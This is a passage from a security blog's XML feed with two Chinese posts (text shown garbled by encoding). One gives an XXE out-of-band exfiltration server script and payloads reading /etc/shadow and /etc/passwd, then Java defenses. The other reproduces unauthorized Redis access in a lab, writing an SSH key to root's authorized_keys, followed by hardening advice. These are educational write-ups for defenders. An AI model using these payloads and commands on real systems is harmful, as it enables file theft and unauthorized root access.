class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> SocketServer</span><br><span class="line"><span class="keyword">from</span> threading <span class="keyword">import</span> Thread</span><br><span class="line"><span class="keyword">from</span> time <span class="keyword">import</span> sleep</span><br><span class="line"><span class="keyword">import</span> logging</span><br><span class="line"><span class="keyword">from</span> sys <span class="keyword">import</span> argv</span><br><span class="line"></span><br><span class="line">logging.basicConfig(filename=<span class="string">'server-xxe-ftp.log'</span>,level=logging.DEBUG)</span><br><span class="line"></span><br><span class="line"><span class="string">"""</span></span><br><span class="line"><span class="string">The XML Payload you should send to the server!</span></span><br><span class="line"><span class="string">&lt;?xml version="1.0" encoding="UTF-8"?&gt;</span></span><br><span class="line"><span class="string">&lt;!DOCTYPE data [</span></span><br><span class="line"><span class="string">  &lt;!ENTITY % file SYSTEM "file:///etc/shadow"&gt;</span></span><br><span class="line"><span class="string">  &lt;!ENTITY % dtd SYSTEM "http://x.x.x.x:8888/evil.dtd"&gt;</span></span><br><span class="line"><span class="string">  %dtd;</span></span><br><span class="line"><span class="string">]&gt;</span></span><br><span class="line"><span class="string">&lt;data&gt;&amp;send;&lt;/data&gt;</span></span><br><span class="line"><span class="string">"""</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">"""&lt;!ENTITY % all "&lt;!ENTITY send SYSTEM 'ftp://&#123;&#125;:&#123;&#125;/%file;'&gt;"&gt;</span></span><br><span class="line"><span class="string">%all;"""</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">wlog</span><span class="params">(_str)</span>:</span></span><br><span class="line">    <span class="keyword">print</span> _str</span><br><span class="line">    logging.info(<span class="string">"&#123;&#125;\n"</span>.format(_str))</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">WebServer</span><span class="params">(SocketServer.BaseRequestHandler)</span>:</span></span><br><span class="line">    <span class="string">"""</span></span><br><span class="line"><span class="string">    Request handler for our webserver.</span></span><br><span class="line"><span class="string">    """</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">handle</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="string">"""</span></span><br><span class="line"><span class="string">        Blanketly return the XML payload regardless of who's asking.</span></span><br><span class="line"><span class="string">        """</span></span><br><span class="line">        resp = <span class="string">"""HTTP/1.1 200 OK\r\nContent-Type: application/xml\r\nContent-length: &#123;&#125;\r\n\r\n&#123;&#125;\r\n\r\n"""</span>.format(len(payload), payload)</span><br><span class="line">        <span class="comment"># self.request is a TCP socket connected to the client</span></span><br><span class="line">        self.data = self.request.recv(<span class="number">4096</span>).strip()</span><br><span class="line">        wlog(<span class="string">"[WEB] &#123;&#125; Connected and sent:"</span>.format(self.client_address[<span class="number">0</span>]))</span><br><span class="line">        wlog(<span class="string">"&#123;&#125;"</span>.format(self.data))</span><br><span class="line">        <span class="comment"># Send back same data but upper</span></span><br><span class="line">        self.request.sendall(resp)</span><br><span class="line">        wlog(<span class="string">"[WEB] Replied with:\n&#123;&#125;"</span>.format(resp))</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">FTPServer</span><span class="params">(SocketServer.BaseRequestHandler)</span>:</span></span><br><span class="line">    <span class="string">"""</span></span><br><span class="line"><span class="string">    Request handler for our ftp.</span></span><br><span class="line"><span class="string">    """</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">handle</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="string">"""</span></span><br><span class="line"><span class="string">        FTP Java handler which can handle reading files</span></span><br><span class="line"><span class="string">        and directories that are being sent by the server.</span></span><br><span class="line"><span class="string">        """</span></span><br><span class="line">        <span class="comment"># set timeout</span></span><br><span class="line">        self.request.settimeout(<span class="number">10</span>)</span><br><span class="line">        wlog(<span class="string">"[FTP] &#123;&#125; has connected"</span>.format(self.client_address[<span class="number">0</span>]))</span><br><span class="line">        self.request.sendall(<span class="string">"220 xxe-ftp-server\n"</span>)</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">                self.data = self.request.recv(<span class="number">4096</span>).strip()</span><br><span class="line">                wlog(<span class="string">"[FTP] Received:\n&#123;&#125;"</span>.format(self.data))</span><br><span class="line">                <span class="keyword">if</span> <span class="string">"LIST"</span> <span class="keyword">in</span> self.data:</span><br><span class="line">                    self.request.sendall(<span class="string">"drwxrwxrwx 1 owner group          1 Feb 21 04:37 rsl\n"</span>)</span><br><span class="line">                    self.request.sendall(<span class="string">"150 Opening BINARY mode data connection for /bin/ls\n"</span>)</span><br><span class="line">                    self.request.sendall(<span class="string">"226 Transfer complete.\n"</span>)</span><br><span class="line">                <span class="keyword">elif</span> <span class="string">"USER"</span> <span class="keyword">in</span> self.data:</span><br><span class="line">                    self.request.sendall(<span class="string">"331 password please - version check\n"</span>)</span><br><span class="line">                <span class="keyword">elif</span> <span class="string">"PORT"</span> <span class="keyword">in</span> self.data:</span><br><span class="line">                    wlog(<span class="string">"[FTP] ! PORT received"</span>)</span><br><span class="line">                    wlog(<span class="string">"[FTP] &gt; 200 PORT command ok"</span>)</span><br><span class="line">                    self.request.sendall(<span class="string">"200 PORT command ok\n"</span>)</span><br><span class="line">                <span class="keyword">elif</span> <span class="string">"SYST"</span> <span class="keyword">in</span> self.data:</span><br><span class="line">                    self.request.sendall(<span class="string">"215 RSL\n"</span>)</span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    wlog(<span class="string">"[FTP] &gt; 230 more data please!"</span>)</span><br><span class="line">                    self.request.sendall(<span class="string">"230 more data please!\n"</span>)</span><br><span class="line">        <span class="keyword">except</span> Exception, e:</span><br><span class="line">            <span class="keyword">if</span> <span class="string">"timed out"</span> <span class="keyword">in</span> e:</span><br><span class="line">                wlog(<span class="string">"[FTP] Client timed out"</span>)</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                wlog(<span class="string">"[FTP] Client error: &#123;&#125;"</span>.format(e))</span><br><span class="line">        wlog(<span class="string">"[FTP] Connection closed with &#123;&#125;"</span>.format(self.client_address[<span class="number">0</span>]))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">start_server</span><span class="params">(conn, serv_class)</span>:</span></span><br><span class="line">    server = SocketServer.TCPServer(conn, serv_class)</span><br><span class="line">    t = Thread(target=server.serve_forever)</span><br><span class="line">    t.daemon = <span class="literal">True</span></span><br><span class="line">    t.start()</span><br><span class="line">    </span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> argv[<span class="number">1</span>]:</span><br><span class="line">        <span class="keyword">print</span> <span class="string">"[-] Need public IP of this server in order to receive data."</span></span><br><span class="line">        exit(<span class="number">1</span>)</span><br><span class="line">    WEB_ARGS = (<span class="string">"0.0.0.0"</span>, <span class="number">8888</span>)</span><br><span class="line">    FTP_ARGS = (<span class="string">"0.0.0.0"</span>, <span class="number">2121</span>)</span><br><span class="line">    payload = payload.format(argv[<span class="number">1</span>],FTP_ARGS[<span class="number">1</span>])</span><br><span class="line">    wlog(<span class="string">"[WEB] Starting webserver on %s:%d..."</span> % WEB_ARGS)</span><br><span class="line">    start_server(WEB_ARGS, WebServer)</span><br><span class="line">    wlog(<span class="string">"[FTP] Starting FTP server on %s:%d..."</span> % FTP_ARGS)</span><br><span class="line">    start_server(FTP_ARGS, FTPServer)</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">            sleep(<span class="number">10000</span>)</span><br><span class="line">    <span class="keyword">except</span> KeyboardInterrupt, e:</span><br><span class="line">        <span class="keyword">print</span> <span class="string">"\n[+] Server shutting down."</span></span><br></pre></td></tr></table></figure><p>è¿è¡Œï¼š</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$ python xxeftp.py 127.0.0.1</span><br><span class="line">[WEB] Starting webserver on 0.0.0.0:8888...</span><br><span class="line">[FTP] Starting FTP server on 0.0.0.0:2121...</span><br></pre></td></tr></table></figure><p>å‘é€payloadï¼Œè¿™æ¬¡æˆ‘ä»¬æŸ¥çœ‹<code>/etc/passwd</code>ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE data [</span><br><span class="line">  &lt;!ENTITY % file SYSTEM &quot;file:///etc/passwd&quot;&gt;</span><br><span class="line">  &lt;!ENTITY % dtd SYSTEM &quot;http://127.0.0.1:8888/evil.dtd&quot;&gt;</span><br><span class="line">  %dtd;</span><br><span class="line">]&gt;</span><br><span class="line">&lt;data&gt;&amp;send;&lt;/data&gt;</span><br></pre></td></tr></table></figure><p>ftpæœåŠ¡å™¨å¾—åˆ°å›æ˜¾ï¼Œä»ç»“æœå¯ä»¥çœ‹åˆ°ï¼Œæœ‰äº›ç¬¦å·è¿˜æ˜¯ä¸­æ–­äº†ftpçš„ä¼ è¾“ï¼š</p><p><img src="/xxe-XXEæ¼æ´åŸç†ã€æ”»å‡»æ–¹å¼ä»¥åŠé˜²å¾¡æ–¹æ³•/1548225798806.png" alt="1548225798806"></p><h1 id="é˜²å¾¡"><a href="#é˜²å¾¡" class="headerlink" title="é˜²å¾¡"></a>é˜²å¾¡</h1><p>javaçš„å¾ˆå¤šåŒ…éƒ½æœ‰xxeè§£æçš„æ¼æ´ï¼Œä½†æ˜¯é˜²å¾¡æ‰‹æ®µéƒ½å¤§åŒå°å¼‚ï¼Œç¦ç”¨å¤–éƒ¨å®ä½“å°±å®Œäº‹äº†ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">DocumentBuilderFactory dbf = DocumentBuilderFactory.newInstance();</span><br><span class="line">dbf.setAttribute(XMLConstants.ACCESS_EXTERNAL_DTD, <span class="string">""</span>);</span><br><span class="line">dbf.setAttribute(XMLConstants.ACCESS_EXTERNAL_SCHEMA, <span class="string">""</span>);</span><br></pre></td></tr></table></figure><p>å…¶ä»–åŒ…çš„ç¦ç”¨æ–¹æ³•å¯ä»¥å‚è€ƒ<a href="https://github.com/OWASP/CheatSheetSeries/blob/master/cheatsheets/XML_External_Entity_Prevention_Cheat_Sheet.md" target="_blank" rel="noopener">OWASP(XXE)_Prevention_Cheat_Sheet</a></p><p>å¯ä»¥çœ‹åˆ°ï¼Œç¦ç”¨å®ä½“ä¹‹åå·²ç»ä¸å­˜åœ¨XXEï¼š</p><p><img src="/xxe-XXEæ¼æ´åŸç†ã€æ”»å‡»æ–¹å¼ä»¥åŠé˜²å¾¡æ–¹æ³•/1548226937710.png" alt="1548226937710"></p><h1 id="ä½¿ç”¨Unmarshallerå’ŒJAXBContexté˜²å¾¡XXEæ¼æ´"><a href="#ä½¿ç”¨Unmarshallerå’ŒJAXBContexté˜²å¾¡XXEæ¼æ´" class="headerlink" title="ä½¿ç”¨Unmarshallerå’ŒJAXBContexté˜²å¾¡XXEæ¼æ´"></a>ä½¿ç”¨Unmarshallerå’ŒJAXBContexté˜²å¾¡XXEæ¼æ´</h1><p>ä½¿ç”¨Unmarshallerå’ŒJAXBContexté˜²å¾¡XXEæ¼æ´æ˜¯æˆ‘æ„Ÿè§‰æœ€ä¼˜é›…çš„è§£å†³åŠæ³•äº†ï¼ŒUnmarshalleræœ¬èº«å°±å±è”½äº†å¤–éƒ¨å®ä½“ï¼Œè‡ªç„¶ä¹Ÿæ²¡æœ‰XXEæ¼æ´ï¼Œä¸ä»…å¦‚æ­¤ï¼Œå®ƒè¿˜èƒ½é€šè¿‡æ³¨è§£ä¸ç±»ç›´æ¥ç»‘å®šï¼Œè¿è§£æéƒ½çœäº†ã€‚</p><h2 id="å®šä¹‰DTO"><a href="#å®šä¹‰DTO" class="headerlink" title="å®šä¹‰DTO"></a>å®šä¹‰DTO</h2><p>æ–°å»ºUserDto.javaæ–‡ä»¶ï¼Œå†…å®¹å¦‚ä¸‹ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@XmlAccessorType</span>(XmlAccessType.FIELD)</span><br><span class="line"><span class="meta">@XmlRootElement</span>(name=<span class="string">"user"</span>)</span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">UserDto</span> </span>&#123;</span><br><span class="line">    <span class="meta">@XmlElement</span></span><br><span class="line"><span class="keyword">private</span> String username;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@XmlElement</span></span><br><span class="line"><span class="keyword">private</span> String password;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">getUsername</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> username;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">getPassword</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> password;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> String <span class="title">toString</span><span class="params">()</span> </span>&#123;</span><br><span class="line"><span class="keyword">return</span> <span class="string">"User(username="</span> + username + <span class="string">", password="</span> + password + <span class="string">")"</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="å®šä¹‰XMLååºåˆ—åŒ–å·¥å…·ç±»"><a href="#å®šä¹‰XMLååºåˆ—åŒ–å·¥å…·ç±»" class="headerlink" title="å®šä¹‰XMLååºåˆ—åŒ–å·¥å…·ç±»"></a>å®šä¹‰XMLååºåˆ—åŒ–å·¥å…·ç±»</h2><p>æ–°å»ºUtil.javaï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Util</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title">xmlStr2obj</span><span class="params">(Class clazz, String xmlStr)</span> </span>&#123;</span><br><span class="line">        Object xmlObject = <span class="keyword">null</span>;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            JAXBContext context = JAXBContext.newInstance(clazz);</span><br><span class="line">            <span class="comment">// è¿›è¡Œå°†Xmlè½¬æˆå¯¹è±¡çš„æ ¸å¿ƒæ¥å£</span></span><br><span class="line">            Unmarshaller unmarshaller = context.createUnmarshaller();</span><br><span class="line">            StringReader sr = <span class="keyword">new</span> StringReader(xmlStr);</span><br><span class="line">            xmlObject = unmarshaller.unmarshal(sr);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (JAXBException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> xmlObject;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å¯ä»¥çœ‹åˆ°æˆ‘ä»¬è¿™é‡Œä½¿ç”¨äº†JAXBContextè¯»å–XMLã€‚</p><h2 id="å®šä¹‰Controller-1"><a href="#å®šä¹‰Controller-1" class="headerlink" title="å®šä¹‰Controller"></a>å®šä¹‰Controller</h2><p>æ–°å»ºXXEController.javaï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@RestController</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">XXEController</span> </span>&#123;</span><br><span class="line">    <span class="meta">@PostMapping</span>(value = <span class="string">"/xxe2"</span>)</span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">xxe2</span><span class="params">(@RequestBody String userString)</span></span>&#123;</span><br><span class="line">        UserDto userDto=(UserDto) Util.xmlStr2obj(UserDto<span class="class">.<span class="keyword">class</span>, <span class="title">userString</span>)</span>;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">"Username: "</span> + userDto.getUsername()+<span class="string">", Password: "</span> + userDto.getPassword();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å¾ˆæœ‰æ„æ€çš„æ˜¯ï¼Œç¬”è€…åœ¨å†™è¿™æ–‡ç« çš„ä¸€å¼€å§‹å°±ä½¿ç”¨äº†Unmarshallerå’ŒJAXBContextçš„æ–¹æ¡ˆï¼Œå¯¼è‡´äº†XXEæ¼æ´æ ¹æœ¬å¤ç°ä¸å‡ºæ¥&gt;_&lt;</p>]]></content>
      
      
      <categories>
          
          <category> Webå®‰å…¨-XXE </category>
          
      </categories>
      
      
        <tags>
            
            <tag> java </tag>
            
            <tag> xxe </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>redisæœªæˆæƒ&amp;å¼±å¯†ç æ¼æ´å¤ç°å’Œé˜²æŠ¤</title>
      <link href="/%E7%BB%84%E4%BB%B6-redis%E6%9C%AA%E6%8E%88%E6%9D%83-%E5%BC%B1%E5%AF%86%E7%A0%81%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E5%92%8C%E9%98%B2%E6%8A%A4/"/>
      <url>/%E7%BB%84%E4%BB%B6-redis%E6%9C%AA%E6%8E%88%E6%9D%83-%E5%BC%B1%E5%AF%86%E7%A0%81%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E5%92%8C%E9%98%B2%E6%8A%A4/</url>
      
        <content type="html"><![CDATA[<h1 id="æ¼æ´å¤ç°"><a href="#æ¼æ´å¤ç°" class="headerlink" title="æ¼æ´å¤ç°"></a>æ¼æ´å¤ç°</h1><h2 id="0x00-é¶æœºé…ç½®"><a href="#0x00-é¶æœºé…ç½®" class="headerlink" title="0x00 é¶æœºé…ç½®"></a>0x00 é¶æœºé…ç½®</h2><ol><li><p>IPï¼š192.168.99.100</p></li><li><p>ä½¿ç”¨<code>apt install redis-server</code>å®‰è£…redisæœåŠ¡</p></li><li><p><code>vi /etc/redis/redis.conf</code>ï¼Œæ³¨é‡Šæ‰<code>bind 127.0.0.1 ::1</code>å³è®©redisç›‘å¬æ‰€æœ‰ç½‘æ®µ</p></li><li><p>æ–°ç‰ˆçš„redisæ— å¯†ç æ—¶ä¼šè§¦å‘ä¿æŠ¤æ¨¡å¼ï¼Œä½¿ç”¨<code>CONFIG SET protected-mode no</code>è§£é™¤ä¿æŠ¤æ¨¡å¼</p></li><li><p>ä»¥rootèº«ä»½å¯åŠ¨redis</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">root@anemone-VirtualBox:/etc<span class="comment"># ps -ef|grep redis-server</span></span><br><span class="line">redis     2847     1  0 21:05 ?        00:00:04 /usr/bin/redis-server *:6379</span><br><span class="line">root@anemone-VirtualBox:/etc<span class="comment"># kill -9 2847</span></span><br><span class="line">root@anemone-VirtualBox:/etc<span class="comment"># redis-server</span></span><br></pre></td></tr></table></figure></li></ol><a id="more"></a><h2 id="0x01æ£€æµ‹æ˜¯å¦å­˜åœ¨æ¼æ´"><a href="#0x01æ£€æµ‹æ˜¯å¦å­˜åœ¨æ¼æ´" class="headerlink" title="0x01æ£€æµ‹æ˜¯å¦å­˜åœ¨æ¼æ´"></a>0x01æ£€æµ‹æ˜¯å¦å­˜åœ¨æ¼æ´</h2><p>åœ¨æ”»å‡»æœºä¸Šæ¢æµ‹ç«¯å£æ˜¯å¦å¼€æ”¾ï¼Œredisé»˜è®¤ç«¯å£ä¸º6379ï¼š<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ nc -nv 192.168.99.100 6379</span><br><span class="line">(UNKNOWN) [192.168.99.100] 6379 (?) open</span><br></pre></td></tr></table></figure></p><p>ä½¿ç”¨<code>apt install redis</code>å®‰è£…redisï¼Œæ¥ç€å°è¯•è¿æ¥ï¼š<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">$ redis-cli -h 192.168.99.100</span><br><span class="line">192.168.99.100:6379&gt; info</span><br><span class="line"><span class="comment"># Server</span></span><br><span class="line">redis_version:4.0.9</span><br><span class="line">redis_git_sha1:00000000</span><br><span class="line">redis_git_dirty:0</span><br><span class="line">redis_build_id:76095d16786fbcba</span><br><span class="line">redis_mode:standalone</span><br><span class="line">os:Linux 4.15.0-30-generic x86_64</span><br><span class="line">arch_bits:64</span><br></pre></td></tr></table></figure></p><h2 id="0x02-å†™sshå…¬é’¥å®ç°è¿œç¨‹ç™»é™†"><a href="#0x02-å†™sshå…¬é’¥å®ç°è¿œç¨‹ç™»é™†" class="headerlink" title="0x02 å†™sshå…¬é’¥å®ç°è¿œç¨‹ç™»é™†"></a>0x02 å†™sshå…¬é’¥å®ç°è¿œç¨‹ç™»é™†</h2><p>é¦–å…ˆç”Ÿäº§å¯†é’¥å¯¹ï¼š</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh-keygen -t rsa</span><br></pre></td></tr></table></figure><p>å°†å…¬é’¥åˆ¶ä½œæˆä¸Šä¼ æ–‡ä»¶ï¼š</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(<span class="built_in">echo</span> -e <span class="string">"\n\n\n"</span>; cat ~/.ssh/id_rsa.pub; <span class="built_in">echo</span> -e <span class="string">"\n\n\n"</span>) &gt; upload.txt</span><br></pre></td></tr></table></figure><p>å°†ä¸Šä¼ æ–‡ä»¶ä¿å­˜åœ¨redis-cliçš„ä¸´æ—¶å˜é‡ä¸­ï¼š</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat ~/upload.txt | redis-cli -h 192.168.99.100 -x <span class="built_in">set</span> tmp</span><br></pre></td></tr></table></figure><p>è¿æ¥redisï¼Œå°†tmpå˜é‡çš„å†…å®¹å†™å…¥/root/.ssh/authorized_keys:<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">redis-cli -h 192.168.99.100</span><br><span class="line">config <span class="built_in">set</span> dir /root/.ssh</span><br><span class="line">config <span class="built_in">set</span> dbfilename authorized_keys</span><br><span class="line">get tmp</span><br><span class="line">save</span><br></pre></td></tr></table></figure></p><p>æ¥ç€ä½¿ç”¨ç§é’¥å³å¯ç™»é™†é¶æœºï¼š<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh -i ~/.ssh/id_rsa root@192.168.99.100</span><br></pre></td></tr></table></figure></p><p>å¯ä»¥å‘ç°ç™»é™†æˆåŠŸï¼š</p><p><img src="/ç»„ä»¶-redisæœªæˆæƒ-å¼±å¯†ç æ¼æ´å¤ç°å’Œé˜²æŠ¤/1546674370840.png" alt="1546674370840"></p><h2 id="0x03-å†™crontabæ–‡ä»¶åå¼¹shell"><a href="#0x03-å†™crontabæ–‡ä»¶åå¼¹shell" class="headerlink" title="0x03 å†™crontabæ–‡ä»¶åå¼¹shell"></a>0x03 å†™crontabæ–‡ä»¶åå¼¹shell</h2><p>crontabè·Ÿsshå·®ä¸å¤šï¼Œä½†æ˜¯ç¬”è€…å†ubuntu18.04ä¸­å¤ç°å¤±è´¥ï¼ŒåŸå› æ˜¯å†™å…¥çš„crontabæ–‡ä»¶å­˜åœ¨redisçš„ä¸€äº›å­—ç¬¦ï¼Œå¯¼è‡´æ ¼å¼ä¸æ­£ç¡®ï¼š</p><p><img src="/ç»„ä»¶-redisæœªæˆæƒ-å¼±å¯†ç æ¼æ´å¤ç°å’Œé˜²æŠ¤/1546674683585-1548679548966.png" alt="1546674683585"></p><h1 id="é˜²æŠ¤"><a href="#é˜²æŠ¤" class="headerlink" title="é˜²æŠ¤"></a>é˜²æŠ¤</h1><ol><li><p>ä½¿ç”¨<code>apt install redis-server</code>çš„æ–¹å¼å®‰è£…ï¼Œå¹¶ä¸”ä½¿ç”¨<code>service redis start</code>å¯åŠ¨redisï¼Œè¿™æ ·redisä¼šåœ¨ä¸€ä¸ªä½æƒé™ç”¨æˆ·ä¸‹è¿è¡Œï¼š</p><p> <img src="/ç»„ä»¶-redisæœªæˆæƒ-å¼±å¯†ç æ¼æ´å¤ç°å’Œé˜²æŠ¤/1546674830672-1548679562502.png" alt="1546674830672"></p></li><li><p>è‹¥å¿…é¡»ä»¥rootèº«ä»½è¿è¡Œï¼Œä¸ºredisè®¾ç½®ä¸€å®šå¼ºåº¦çš„å¯†ç ï¼ˆå®é™…å¤ç°ä¸­æˆ‘ä»¬å¯ä»¥å‘ç°ï¼Œæ–°ç‰ˆredisåœ¨ä»¥rootè¿è¡Œï¼Œä¸è®¾ç½®å¯†ç çš„æƒ…å†µä¸‹ä¼šå¯åŠ¨ä¿æŠ¤æ¨¡å¼ï¼Œåªå…è®¸æœ¬åœ°cliï¼‰</p></li><li><p>å®šæ—¶æ£€æŸ¥redisæ—¥å¿—ï¼š</p><p><img src="/ç»„ä»¶-redisæœªæˆæƒ-å¼±å¯†ç æ¼æ´å¤ç°å’Œé˜²æŠ¤/1546674924759-1548679583781.png" alt="1546674924759"></p></li></ol><h1 id="å‚è€ƒèµ„æ–™"><a href="#å‚è€ƒèµ„æ–™" class="headerlink" title="å‚è€ƒèµ„æ–™"></a>å‚è€ƒèµ„æ–™</h1><ol><li><a href="https://www.freebuf.com/column/158065.html" target="_blank" rel="noopener">Redisæœªæˆæƒè®¿é—®è¯¦è§£</a></li></ol>]]></content>
      
      
      <categories>
          
          <category> Webå®‰å…¨-ç»„ä»¶ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> redis </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>PHPååºåˆ—åŒ–åŸºæœ¬åŸç†</title>
      <link href="/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%9F%BA%E6%9C%AC%E5%8E%9F%E7%90%86/"/>
